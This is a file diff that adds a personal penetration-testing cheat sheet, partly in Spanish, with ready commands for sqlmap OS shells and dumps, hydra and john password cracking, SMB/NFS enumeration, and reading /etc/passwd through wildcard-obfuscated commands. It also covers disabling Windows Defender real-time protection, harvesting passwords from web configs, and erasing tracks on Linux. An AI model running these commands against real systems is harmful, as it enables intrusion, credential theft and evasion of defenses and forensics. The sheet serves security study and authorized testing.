@@ -1,1 +1,207 @@
-There was an error.
+
+   
+COMMON PORTS
+............
+
+25 - SMTP
+22 - SSH
+110 - POP3
+143 - IMAP
+80 - HTTP
+443 - HTTPS
+137, 138, 139 - NETBIOS
+115 - SFTP
+23 - Telnet
+21 - FTP
+3389 - RDP
+3306 - MySQL
+1433 - MS SQL Server
+445 - SMB
+
+
+HOW TO SET ROUTE
+.................
+
+ip route add <Network To Which We Need Access> via <GATEWAY>
+    ejemplo:
+        ip route add 192.168.1.0/24 via 10.10.15.1
+
+
+BANNER GRABING
+...............
+
+nc -nv  <IP> <port>
+
+
+SQLMAP
+.......
+
+sqlmap -u http://<IP address> -p parameter
+
+sqlmap -u http://<IP address> –os-shell
+
+sqlmap -u http://<IP address> –dump
+
+https://hackersonlineclub.com/sql-injection-cheatsheet/
+
+
+CRACKING PASSWORDS
+...................
+
+john -wordlist /path/to/wordlist -users=users.txt hashfile
+
+mas en.... Practical_Password_Cracking.pdf
+
+
+HYDRA
+......
+
+hydra -L users.txt -P pass.txt -t 10 <IP address> ssh -s 22
+hydra -L user.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form "[URL]:[TOKEN-URL]:Login failed"
+
+Replace "ssh" with any service name
+
+
+SMB
+....
+
+enum4linux -a <IP address>
+smbclient -L IP -N
+
+    Para conectarse:
+        smbclient //IP/RECURSO -n
+    Una vez dentro para descargar archivos:
+        prompt off
+        mget *
+        smbget -R smb://IP/recurso
+
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse [IP]
+
+mas en.... SMB_Enum&Exploitation.pdf
+
+
+NFS
+....
+
+*Listar recursos nfs en una maquina:
+    showmount -e [IP]
+
+*Para conectarse al recurso:
+    sudo mount -t nfs IP:/recurso unacarpetanuestra
+
+
+BORRAR RASTRO RAPIDAMENTE EN MAQUINAS LINUX
+............................................
+
+shred -zun 5 -v
+
+https://hackingpassion.com/clear-your-tracks-on-linux/
+https://null-byte.wonderhowto.com/how-to/clear-logs-bash-history-hacked-linux-systems-cover-your-tracks-remain-undetected-0244768/
+
+
+ESCAPAR COMANDOS
+.................
+
+Simplemente hay que poner ciertos carácteres aleatorios ocupando el espacio que habria al poner el comando normal con su ruta completa, por ejemplo:
+
+cat
+    normal= cat /etc/passwd 
+    extendido= /bin/cat /etc/passwd
+    extendido escapado= /???/??t /etc/passwd
+    extendido normal=c${HOA}at /etc/passwd
+
+
+
+METASPLOIT INIT
+................
+
+sudo msfdb init
+sudo service postgresql start
+sudo msfconsole
+
+
+
+METERPRETER A SESION ESTABLE DE METERPRETER
+...........................................
+
+Ver el pdf meterpreter-to-stable.meterpreter.pdf
+
+
+TRATAMIENTO DE IMAGENES
+........................
+
+exiftool imagen.png --> Sacar datos exif de una imagen
+strings imagen.png --> Sacar los strings, texto, datos ocultos de una imagen
+
+
+OTROS RECURSOS
+...............
+
+Extension firefox Hack-Tools
+Hacking_Help_Sheet_Resume1.png
+Hacking_Help_Sheet_Resume2.png
+
+
+BUSCAR ARCHIVOS SUID,SGID,StickyBit
+....................................
+
+find / -perm -u=s -type f 2>/dev/nul
+find / -perm -4000 2>/dev/null
+
+
+WPSCAN
+.......
+
+wpscan --url [URL] -e u
+wpscan --url [URL]
+wpscan --url [URL] --usernames admin --passwords rockyou.txt --max-threads 5 --> Fuerza bruta panel login wordpress
+wpscan --url [URL] -e vp --> Enumerar plugins vulnerables en el sitio web
+
+
+WINDOWS TRICKS
+...............
+
+Información sobre Windows Defender → "sc query windefend"
+
+Enumeración de todos los servicios corriendo en la máquina (incluyendo antivirus) → "sc queryex type= service"
+
+Enumeración de los antivirus que tiene el equipo → "WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName"
+
+Configuración y estado del firewall (características activadas y desactivadas...) → "netsh advfirewall firewall dump"
+
+Podemos probar a deshabilitar el escaneo de todos los ficheros descargados y/o adjuntos para subir nuestros ficheros... → "Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus" luego → "Set-MpPreference -DisableIOAVProtection $true"
+
+Listar reglas de AppLocker → "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections"
+
+
+LINUX TRICK /var/www/html
+...........................
+
+Si tras ganar acceso a una shell en la maquina objetivo, somos un usuario con pocos privilegios pero tenemos acceso a /var/www/html podemos buscar mediante el siguiente comando find archivos de configuracion que contengan contraseñas o datos sensibles, para empezar a ganar privilegios:
+    find . -iname '*config*' -type f -exec grep -nie 'pass.*=' --color=always /dev/null {} \;
+
+
+RDP
+....
+
+xfreerdp /u:[USER] /p:[PASS] /v:[IP] /cert-ignore -- Para conectarse por RDP a un equipo
+
+
+VULNERABILIDAD LOG4J
+....................
+
+https://guglia001.github.io/cve/poc/articulo/log4j-CVE-POC/
+https://jmlgomez73.github.io/log4shell/
+https://github.com/fullhunt/log4j-scan
+
+ACTIVE DIRECTORY
+................
+
+https://www.hackplayers.com/2022/03/top10-de-ataques-al-directorio-activo.html
+
+
+DESCARGA DE ARCHIVOS POR COMANDO
+.................................
+
+Linux --> wget [URL]
+Windows --> powershell -c "Invoke-WebRequest -Uri '[URL]'" -OutFile archivo
